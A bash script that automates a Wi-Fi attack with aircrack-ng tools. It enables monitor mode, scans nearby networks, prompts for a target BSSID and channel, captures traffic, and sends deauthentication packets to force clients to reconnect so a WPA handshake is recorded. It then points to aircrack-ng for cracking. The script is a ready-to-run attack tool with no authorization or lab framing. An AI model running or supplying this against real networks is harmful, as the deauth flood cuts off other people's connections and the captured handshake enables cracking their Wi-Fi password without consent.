#!/bin/bash
set -uo pipefail

DEVICE_ID="0bda:8187"
IFACE="wlan0"

echo "=== USB device check ==="
usb=$(lsusb)
echo "$usb"

if echo "$usb" | grep -qF "$DEVICE_ID"; then
    echo "USB device ($DEVICE_ID) is connected."
else
    echo "USB device ($DEVICE_ID) not found."
    exit 1
fi

# --- Kill conflicting processes (NetworkManager, wpa_supplicant, etc.) ---
echo "=== Killing conflicting processes ==="
sudo airmon-ng check kill

# --- Enable monitor mode ---
echo "=== Starting monitor mode on $IFACE ==="
mon_output=$(sudo airmon-ng start "$IFACE" 2>&1)
echo "$mon_output"

# Figure out the actual monitor interface name (often renamed, e.g. wlan0mon)
mon_iface=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | grep -i mon | head -n1)
if [ -z "$mon_iface" ]; then
    mon_iface="$IFACE"
fi

if iw dev "$mon_iface" info >/dev/null 2>&1; then
    echo "Monitor mode enabled on interface: $mon_iface"
else
    echo "Failed to confirm monitor mode on $mon_iface"
    exit 1
fi

# --- Scan for nearby networks ---
echo "=== Scanning for nearby Wi-Fi networks (10s) ==="
scan_prefix="scan4"
sudo timeout 10 airodump-ng "$mon_iface" --write "$scan_prefix" --output-format csv --write-interval 1

scan_file="${scan_prefix}-01.csv"
if [ -f "$scan_file" ]; then
    echo "=== Scan results ==="
    cat "$scan_file"
else
    echo "Scan file $scan_file not found. Something went wrong with the scan."
    exit 1
fi

# --- Get target from user ---
read -rp "Enter channel number: " channelno
read -rp "Enter target MAC address (BSSID): " macaddress

# --- Start capture in the background ---
echo "=== Starting handshake capture on channel $channelno for $macaddress ==="
capture_prefix="wificapture23"
sudo airodump-ng -w "$capture_prefix" -c "$channelno" --bssid "$macaddress" "$mon_iface" \
    > /tmp/airodump_capture.log 2>&1 &
capture_pid=$!

# Give airodump-ng a moment to lock onto the channel before deauthing
sleep 3

# --- Deauthenticate clients to force a handshake ---
echo "=== Sending deauth packets ==="
sudo aireplay-ng --deauth 10 -a "$macaddress" "$mon_iface"

# Let the capture keep running a bit to actually catch the re-handshake
echo "=== Waiting for handshake capture ==="
sleep 15

# --- Stop the capture ---
sudo kill "$capture_pid" 2>/dev/null
wait "$capture_pid" 2>/dev/null

echo "=== Done ==="
echo "Capture files saved with prefix: $capture_prefix (look for ${capture_prefix}-01.cap)"
echo "You can verify the handshake with: aircrack-ng ${capture_prefix}-01.cap"

# --- Optional: restore managed mode ---
read -rp "Stop monitor mode and restore managed mode now? [y/N] " restore
if [[ "$restore" =~ ^[Yy]$ ]]; then
    sudo airmon-ng stop "$mon_iface"
    sudo systemctl restart NetworkManager 2>/dev/null || sudo service network-manager restart 2>/dev/null
fi
